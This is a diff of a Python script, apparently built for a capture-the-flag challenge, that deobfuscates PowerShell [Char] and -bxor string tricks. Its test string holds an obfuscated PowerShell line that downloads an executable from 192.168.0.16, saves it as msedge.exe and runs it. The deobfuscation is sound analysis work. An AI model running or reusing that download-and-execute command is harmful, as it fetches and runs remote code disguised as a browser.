@@ -9,6 +9,7 @@ def remove_spaces_bracket(match):
     return f"[Char]({match.group(1)}{match.group(2)}{match.group(3)})"
 
 def char_intended(code):
+    code = re.compile(r'\[Char\]\s+\(([-\d\+\*/\^]+)\)', re.IGNORECASE).sub(r'[Char](\1)', code)
     resultnumber = re.compile(r'\[Char\]\s+(\d+)', re.IGNORECASE).sub(r'[Char]\1', code)
     resultexpr = re.compile(r'\[Char\]\s*\(\s*(-?\d+)\s*([+\-*/])\s*(-?\d+)\s*\)', re.IGNORECASE).sub(remove_spaces_bracket, resultnumber)
     resultbxor = re.compile(r'\s*(-?\d+)\s*-\s*bxor\s*(-?\d+)\s*', re.IGNORECASE).sub(r'\1 -bxor \2', resultexpr)
@@ -19,13 +20,14 @@ def char_intended(code):
 def replace_match(match):
     res = match.group(1)
     matchsymbol = re.sub(r'(?<=\d)([\+\*/\^])(?=\d)', r' \1 ', res)
-    minussymbol = re.sub(r'(?<=\d)-(?=\d)', r' - ', matchsymbol) 
+    minussymbol = re.sub(r'(?<=\d)-(?=\d)', r' - ', matchsymbol)
     changebxor = minussymbol.replace('-bxor', '^')
     final_result = re.sub(r'^\((.*)\)$', r'\1', changebxor)
     return f'Chr({final_result})'
 
 def char_transform(code):
-    return re.compile(r'\[char\]([-\d\+\*/\^()]+(?:\s?-bxor\s?[-\d\+\*/\^()]+)?)', re.IGNORECASE).sub(replace_match, code)
+    return re.compile(r'\[char\]\(([-\d\+\*/\^\s]+(?:\s?-bxor\s?[-\d\+\*/\^\s]+)?)\)|\[Char\]([-0-9]+)', re.IGNORECASE).sub(replace_match, code)
+
  
 def decode_chr(expr):
     numbers = list(map(int, re.findall(r'-?\d+', expr)))
@@ -47,10 +49,11 @@ def decode_chr(expr):
     return chr(result)
 
 def check_symbols(symbol):
+
     chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
     chr_substrings = chr_pattern.findall(symbol)
     temp_string = chr_pattern.sub("temp", symbol)
-    temp_string = temp_string.replace(" + ", "")
+    temp_string = temp_string.replace("+", "")
     for chr_substring in chr_substrings:
         temp_string = temp_string.replace("temp", chr_substring, 1)
     return temp_string
@@ -70,19 +73,19 @@ def concat_test(code):
                 break
     gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
     check = code.split('=')
-    newcoderes = []    
+    newcoderes = []
+    print(gabungin)
     for i in range(len(check)):
         newcoderes.append(check_symbols(check[i]))
         if i != len(check) - 1:
             newcoderes.append('=')
     newcode = ''.join([i  for i in newcoderes]).strip('\n')
     code = []
+    newcode = newcode.replace('"', "").replace("'", "")
     for i, element in enumerate(gabungin):
         if len(element) == 1:
-            newcode = newcode.replace(results[i], gabungin[i])
-        else:
-            newcode = newcode.replace("+", "").replace('"', "").replace("'", "").replace(" ", "")
-    return newcode
+            newcode = newcode.replace(results[i], element)
+    return newcode.replace(" ", "").replace("(", "").replace(")","")
 
 
 def deobfuscate(code):
@@ -92,11 +95,11 @@ def deobfuscate(code):
     return code
 
 testing = """
-$tes = [Char]        70 + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
-$tes2 = [ChaR](99   -  10)+[CHAR](109 -bxor   4)
+$tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
+$tes2 = [ChaR](99   -  10  + 1)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = [ChaR](99+               13)   +   [CHar](109 -bxor 4)
-$tes5 = 'hel'+"lo"
-$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
+$tes5 = 'hel'+([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo"
+$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D+/chall_mem_se'+'arch.e'+'xe'+;$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
 """
 print(deobfuscate(testing))
